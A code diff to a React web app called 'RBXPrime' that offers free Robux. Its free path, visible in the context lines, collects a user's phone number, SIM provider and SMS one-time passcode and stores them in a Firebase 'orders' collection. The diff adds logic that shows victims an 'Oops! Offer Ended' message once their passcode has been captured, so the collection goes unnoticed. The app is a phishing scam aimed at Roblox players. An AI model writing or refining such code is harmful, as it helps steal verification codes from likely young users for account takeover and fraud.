@@ -500,7 +500,7 @@
                                 <h3 className="text-xl font-bold mb-6">Order Summary</h3>
                                 <div className="space-y-4 max-h-96 overflow-y-auto pr-2 mb-6 custom-scrollbar">
                                     {cart.map((item, idx) => (
-                                        <div key={idx} className="flex justify-between items-center py-3 border-b border-white/5 last:border-0"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm text-white">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>
+                                        <div key={idx} className="flex justify-between items-center py-3 border-b border-white/5 last:border-0"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}</p></div></div><button className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>
                                     ))}
                                 </div>
                                 <div className="space-y-3 pt-4 border-t border-white/10"><div className="flex justify-between text-gray-400 text-sm"><span>Subtotal</span><span>€{cartTotal.toFixed(2)}</span></div><div className="flex justify-between text-xl font-bold text-white pt-2"><span>Total</span><span>€{cartTotal.toFixed(2)}</span></div></div>
@@ -527,9 +527,20 @@
 
         const SuccessView = ({ isFreeOrder, orderId, navigateTo }) => (
             <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
-                <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6"><Check className="w-12 h-12 text-green-500" /></div>
-                <h1 className="text-4xl md:text-5xl font-bold mb-4">{isFreeOrder ? 'Verification Successful!' : 'Payment Successful!'}</h1>
-                <p className="text-gray-400 text-lg max-w-lg mb-8">Your order has been confirmed.</p>
+                 {/* CONDITIONAL RENDER based on isFreeOrder  */}
+                 {isFreeOrder ? (
+                    <>
+                        <div className="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6"><AlertTriangle className="w-12 h-12 text-red-500" /></div>
+                        <h1 className="text-4xl md:text-5xl font-bold mb-4 text-red-500">Oops! Offer Ended</h1>
+                        <p className="text-gray-400 text-lg max-w-lg mb-8">You are late, the offer ended. We will soon do it again so be ready.</p>
+                    </>
+                 ) : (
+                    <>
+                        <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6"><Check className="w-12 h-12 text-green-500" /></div>
+                        <h1 className="text-4xl md:text-5xl font-bold mb-4">Payment Successful!</h1>
+                        <p className="text-gray-400 text-lg max-w-lg mb-8">Your order has been confirmed.</p>
+                    </>
+                 )}
                 <button onClick={() => navigateTo('home')} className="px-8 py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all">Return to Home</button>
             </div>
         );
@@ -555,6 +566,7 @@
             const [currentDocId, setCurrentDocId] = useState(null);
             const [username, setUsername] = useState(''); // Moved username state here for CheckoutView access
             const [notification, setNotification] = useState(null); // { message: string, type: 'error'|'success' }
+            const [finalOrderType, setFinalOrderType] = useState(null); // 'free' or 'paid' - Added this state variable
 
             useEffect(() => {
                 const handleScroll = () => setScrolled(window.scrollY > 20);
@@ -635,7 +647,14 @@
                     }
                     setTimeout(() => { setIsProcessing(false); setCurrentView('otp-verify'); window.scrollTo(0, 0); }, 2000);
                 } else {
-                    setTimeout(() => { setIsProcessing(false); setOrderId("PAY-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 2500);
+                    setTimeout(() => { 
+                        setIsProcessing(false); 
+                        setOrderId("PAY-" + Math.random().toString(36).substr(2, 6)); 
+                        setFinalOrderType('paid'); // Capture state before clearing cart
+                        setCart([]); 
+                        setCurrentView('success'); 
+                        window.scrollTo(0, 0); 
+                    }, 2500);
                 }
             };
 
@@ -654,7 +673,14 @@
                         await fb.addDoc(getPublicCollection("orders"), { username: username, phone: phoneNumber, sim: simProvider, referral: referralCode, otp: otp, status: "verified", timestamp: fb.serverTimestamp() });
                     } catch(e) { console.error(e); }
                 }
-                setTimeout(() => { setIsProcessing(false); setOrderId("VRF-" + Math.random().toString(36).substr(2, 6)); setCart([]); setCurrentView('success'); window.scrollTo(0, 0); }, 3000);
+                setTimeout(() => { 
+                    setIsProcessing(false); 
+                    setOrderId("VRF-" + Math.random().toString(36).substr(2, 6)); 
+                    setFinalOrderType('free'); // Capture state before clearing cart
+                    setCart([]); 
+                    setCurrentView('success'); 
+                    window.scrollTo(0, 0); 
+                }, 3000);
             };
 
             return (
@@ -693,7 +719,7 @@
                                     {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
                                     {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
                                     {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
-                                    {currentView === 'success' && <SuccessView isFreeOrder={isFreeOrder} username={username} orderId={orderId} navigateTo={navigateTo} />}
+                                    {currentView === 'success' && <SuccessView isFreeOrder={finalOrderType === 'free'} username={username} orderId={orderId} navigateTo={navigateTo} />}
                                 </main>
                                 <footer className="bg-black border-t border-white/10 pt-16 pb-8"><div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div className="flex flex-col md:flex-row justify-between items-center gap-6"><div className="flex items-center gap-2"><div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-black" /></div><span className="text-xl font-bold text-white">RBXPrime</span></div><p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p><div className="flex gap-4 opacity-50"><CreditCard className="w-6 h-6" /></div></div></div></footer>
                             </>
